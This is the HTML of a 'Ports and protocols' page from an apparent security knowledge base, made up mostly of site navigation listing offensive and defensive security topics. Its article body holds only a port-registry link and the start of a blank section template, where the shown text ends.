



<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
      
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
    
    
      
        <title>Ports and protocols - Security Knowledge Base</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/application.1b62728e.css">
      
      
    
    
      <script src="../assets/javascripts/modernizr.268332fc.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../_site/extra.css">
    
    
      
    
    
  </head>
  
    <body dir="ltr">
  
    <svg class="md-svg">
      <defs>
        
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#template" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href=".." title="Security Knowledge Base" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              Security Knowledge Base
            </span>
            <span class="md-header-nav__topic">
              
                Ports and protocols
              
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main" role="main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href=".." title="Security Knowledge Base" class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </a>
    Security Knowledge Base
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href=".." title="Home" class="md-nav__link">
      Home
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../active-directory/" title="Active directory" class="md-nav__link">
      Active directory
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../apt/" title="APT" class="md-nav__link">
      APT
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../books/" title="Books" class="md-nav__link">
      Books
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../bug-hunting/" title="Bug hunting" class="md-nav__link">
      Bug hunting
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../career/" title="Career" class="md-nav__link">
      Career
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../collections/" title="Collections" class="md-nav__link">
      Collections
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../container/" title="Container" class="md-nav__link">
      Container
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../crypto/" title="Crypto" class="md-nav__link">
      Crypto
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../databases-sqlserver/" title="Databases - SqlServer" class="md-nav__link">
      Databases - SqlServer
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../databases/" title="Databases" class="md-nav__link">
      Databases
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../dfir/" title="DFIR" class="md-nav__link">
      DFIR
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../docker/" title="Docker" class="md-nav__link">
      Docker
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../embedded-and-iot/" title="Embedded and iot" class="md-nav__link">
      Embedded and iot
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../exploits_and_shellcoding/" title="Exploits and shellcoding" class="md-nav__link">
      Exploits and shellcoding
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../iam-kerberos/" title="IAM - Kerberos" class="md-nav__link">
      IAM - Kerberos
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../iam/" title="IAM" class="md-nav__link">
      IAM
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../languages/" title="Languages" class="md-nav__link">
      Languages
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../linux-issues/" title="Linux issues" class="md-nav__link">
      Linux issues
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../linux/" title="Linux" class="md-nav__link">
      Linux
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../malware/" title="Malware" class="md-nav__link">
      Malware
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../network/" title="Network" class="md-nav__link">
      Network
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../operating-systems/" title="Operating systems" class="md-nav__link">
      Operating systems
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../osint/" title="OSINT" class="md-nav__link">
      OSINT
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../password-attacks/" title="Password attacks" class="md-nav__link">
      Password attacks
    </a>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        Ports and protocols
      </label>
    
    <a href="./" title="Ports and protocols" class="md-nav__link md-nav__link--active">
      Ports and protocols
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#template" class="md-nav__link">
    Template
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#citrix-1494tcp" class="md-nav__link">
    Citrix - 1494/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dhcp" class="md-nav__link">
    DHCP
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dns-53tcp" class="md-nav__link">
    DNS - 53/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#elasticsearch-9200tcp" class="md-nav__link">
    ElasticSearch - 9200/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#finger-79tcp" class="md-nav__link">
    Finger - 79/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ftp-21tcp" class="md-nav__link">
    FTP - 21/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#imap-134tcp-993tcp" class="md-nav__link">
    IMAP - 134/tcp 993/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#irc-8067tcp" class="md-nav__link">
    IRC - 8067/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ldap-389tcp" class="md-nav__link">
    LDAP - 389/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#memcache" class="md-nav__link">
    Memcache
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#modbus-502tcp" class="md-nav__link">
    Modbus - 502/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#nfs-2049tcp" class="md-nav__link">
    NFS - 2049/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ntp-123tcp" class="md-nav__link">
    NTP - 123/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pop3-110tcp" class="md-nav__link">
    POP3 - 110/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pptp-l2tp-vpn-500tcp-1723tcp" class="md-nav__link">
    PPTP-L2TP-VPN - 500/tcp 1723/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#rdp-3389tcp" class="md-nav__link">
    RDP - 3389/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#rlogin-513tcp" class="md-nav__link">
    rlogin - 513/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#smb-samba-netbios-137udp-138udp-137tcp-139tcp-445tcp" class="md-nav__link">
    SMB-Samba-NetBIOS - (137/udp 138/udp), (137/tcp 139/tcp), 445/tcp
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#quick-reference" class="md-nav__link">
    Quick Reference
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    Summary
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#version" class="md-nav__link">
    Version
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#scanning" class="md-nav__link">
    Scanning
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enable-disable-status" class="md-nav__link">
    Enable / Disable / Status
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#other" class="md-nav__link">
    Other
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tools" class="md-nav__link">
    Tools
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerabilities" class="md-nav__link">
    Vulnerabilities
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hardening" class="md-nav__link">
    Hardening
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#smtp-25tcp" class="md-nav__link">
    SMTP - 25/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#snmp-161udp" class="md-nav__link">
    SNMP - 161/udp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#squidproxy-3128tcp" class="md-nav__link">
    SquidProxy - 3128/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ssh-22tcp" class="md-nav__link">
    SSH - 22/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#telnet-23tcp" class="md-nav__link">
    Telnet - 23/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tftp-69tcp" class="md-nav__link">
    TFTP - 69/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#vnc-5900tcp" class="md-nav__link">
    VNC - 5900/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#webdev" class="md-nav__link">
    WebDev
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#x11-6000tcp" class="md-nav__link">
    X11 - 6000/tcp
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../red-blue-team/" title="Red blue team" class="md-nav__link">
      Red blue team
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../reverse-engineering/" title="Reverse engineering" class="md-nav__link">
      Reverse engineering
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../rf-and-sdr/" title="RF and SDR" class="md-nav__link">
      RF and SDR
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../steganography/" title="Steganography" class="md-nav__link">
      Steganography
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../vulnerable/" title="Vulnerable" class="md-nav__link">
      Vulnerable
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../wifi/" title="WiFi" class="md-nav__link">
      WiFi
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../windows-issues/" title="Windows issues" class="md-nav__link">
      Windows issues
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-36" type="checkbox" id="nav-36">
    
    <label class="md-nav__link" for="nav-36">
      Certifications
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-36">
        Certifications
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/cissp/" title="CISSP" class="md-nav__link">
      CISSP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/osce/" title="OSCE" class="md-nav__link">
      OSCE
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-36-3" type="checkbox" id="nav-36-3">
    
    <label class="md-nav__link" for="nav-36-3">
      Oscp
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-36-3">
        Oscp
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/0-cheatsheet/" title="Enumeration" class="md-nav__link">
      Enumeration
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/_collections/" title="collections" class="md-nav__link">
       collections
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/_preparation/" title="Was checking" class="md-nav__link">
      Was checking
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/lab-setup/" title="Lab Setup" class="md-nav__link">
      Lab Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/notes/" title="Notes" class="md-nav__link">
      Notes
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/practice-vulnhub/" title="Practice" class="md-nav__link">
      Practice
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/setup/" title="Setup" class="md-nav__link">
      Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/y-Tools/" title="Tools" class="md-nav__link">
      Tools
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-36-3-9" type="checkbox" id="nav-36-3-9">
    
    <label class="md-nav__link" for="nav-36-3-9">
      Cheatsheet
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-36-3-9">
        Cheatsheet
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/0-cheatsheet/" title="Cheatsheets" class="md-nav__link">
      Cheatsheets
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/download/" title="Download" class="md-nav__link">
      Download
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/exploits/" title="Exploits" class="md-nav__link">
      Exploits
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/post-exploitation/" title="Post exploitation" class="md-nav__link">
      Post exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/share-files/" title="Share files" class="md-nav__link">
      Share files
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/shell/" title="Bash" class="md-nav__link">
      Bash
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/tty/" title="TTY" class="md-nav__link">
      TTY
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-36-3-9-10" type="checkbox" id="nav-36-3-9-10">
    
    <label class="md-nav__link" for="nav-36-3-9-10">
      Enumeration
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-36-3-9-10">
        Enumeration
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/enumeration/network/" title="Network" class="md-nav__link">
      Network
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/enumeration/vulnerability/" title="Vulnerability" class="md-nav__link">
      Vulnerability
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/enumeration/windows-local/" title="Windows local" class="md-nav__link">
      Windows local
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-37" type="checkbox" id="nav-37">
    
    <label class="md-nav__link" for="nav-37">
      Cloud
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-37">
        Cloud
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../cloud/aws/" title="Aws" class="md-nav__link">
      Aws
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../cloud/azuer/" title="Azuer" class="md-nav__link">
      Azuer
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-38" type="checkbox" id="nav-38">
    
    <label class="md-nav__link" for="nav-38">
      Os
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-38">
        Os
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-38-1" type="checkbox" id="nav-38-1">
    
    <label class="md-nav__link" for="nav-38-1">
      Windows
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-38-1">
        Windows
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/active-directory/" title="Active Directory" class="md-nav__link">
      Active Directory
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/important-files/" title="Important Files" class="md-nav__link">
      Important Files
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/important-processes/" title="Important Processes" class="md-nav__link">
      Important Processes
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/mix/" title="Mix" class="md-nav__link">
      Mix
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/post-exploitation/" title="Post exploitation" class="md-nav__link">
      Post exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/privilege-escalation/" title="Privilege Escalation" class="md-nav__link">
      Privilege Escalation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-38-1-7" type="checkbox" id="nav-38-1-7">
    
    <label class="md-nav__link" for="nav-38-1-7">
      Credentials
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-38-1-7">
        Credentials
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/credentials/0-cheatsheed/" title="Cheatsheet" class="md-nav__link">
      Cheatsheet
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/credentials/using-credentials/" title="Using Credentials" class="md-nav__link">
      Using Credentials
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-38-1-8" type="checkbox" id="nav-38-1-8">
    
    <label class="md-nav__link" for="nav-38-1-8">
      Powershell
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-38-1-8">
        Powershell
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/powershell/0-cheatsheet/" title="Cheatsheet" class="md-nav__link">
      Cheatsheet
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/powershell/collections/" title="Collections" class="md-nav__link">
      Collections
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/powershell/modules/" title="Modules" class="md-nav__link">
      Modules
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/powershell/powershell/" title="Reverse Shell" class="md-nav__link">
      Reverse Shell
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/powershell/z-Resources/" title="Resources" class="md-nav__link">
      Resources
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#template" class="md-nav__link">
    Template
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#citrix-1494tcp" class="md-nav__link">
    Citrix - 1494/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dhcp" class="md-nav__link">
    DHCP
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dns-53tcp" class="md-nav__link">
    DNS - 53/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#elasticsearch-9200tcp" class="md-nav__link">
    ElasticSearch - 9200/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#finger-79tcp" class="md-nav__link">
    Finger - 79/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ftp-21tcp" class="md-nav__link">
    FTP - 21/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#imap-134tcp-993tcp" class="md-nav__link">
    IMAP - 134/tcp 993/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#irc-8067tcp" class="md-nav__link">
    IRC - 8067/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ldap-389tcp" class="md-nav__link">
    LDAP - 389/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#memcache" class="md-nav__link">
    Memcache
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#modbus-502tcp" class="md-nav__link">
    Modbus - 502/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#nfs-2049tcp" class="md-nav__link">
    NFS - 2049/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ntp-123tcp" class="md-nav__link">
    NTP - 123/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pop3-110tcp" class="md-nav__link">
    POP3 - 110/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pptp-l2tp-vpn-500tcp-1723tcp" class="md-nav__link">
    PPTP-L2TP-VPN - 500/tcp 1723/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#rdp-3389tcp" class="md-nav__link">
    RDP - 3389/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#rlogin-513tcp" class="md-nav__link">
    rlogin - 513/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#smb-samba-netbios-137udp-138udp-137tcp-139tcp-445tcp" class="md-nav__link">
    SMB-Samba-NetBIOS - (137/udp 138/udp), (137/tcp 139/tcp), 445/tcp
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#quick-reference" class="md-nav__link">
    Quick Reference
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    Summary
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#version" class="md-nav__link">
    Version
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#scanning" class="md-nav__link">
    Scanning
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enable-disable-status" class="md-nav__link">
    Enable / Disable / Status
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#other" class="md-nav__link">
    Other
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tools" class="md-nav__link">
    Tools
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerabilities" class="md-nav__link">
    Vulnerabilities
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hardening" class="md-nav__link">
    Hardening
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#smtp-25tcp" class="md-nav__link">
    SMTP - 25/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#snmp-161udp" class="md-nav__link">
    SNMP - 161/udp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#squidproxy-3128tcp" class="md-nav__link">
    SquidProxy - 3128/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ssh-22tcp" class="md-nav__link">
    SSH - 22/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#telnet-23tcp" class="md-nav__link">
    Telnet - 23/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tftp-69tcp" class="md-nav__link">
    TFTP - 69/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#vnc-5900tcp" class="md-nav__link">
    VNC - 5900/tcp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#webdev" class="md-nav__link">
    WebDev
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#x11-6000tcp" class="md-nav__link">
    X11 - 6000/tcp
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                
                  <h1>Ports and protocols</h1>
                
                <ul>
<li><a href="https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml">Service Name and Transport Protocol Port Number Registry</a></li>
</ul>
<h2 id="template">Template<a class="headerlink" href="#template" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="o">##</span> <span class="n">Name</span> <span class="o">-</span> <span class="n">port</span><span class="o">/</span><span class="n">tcp_or_udp</span>

<span class="o">**</span><span class="n">Quick</span> <span class="n">Reference</span><span class="o">**</span>
<span class="o">**</span><span class="n">Tools</span><span class="o">**</span>
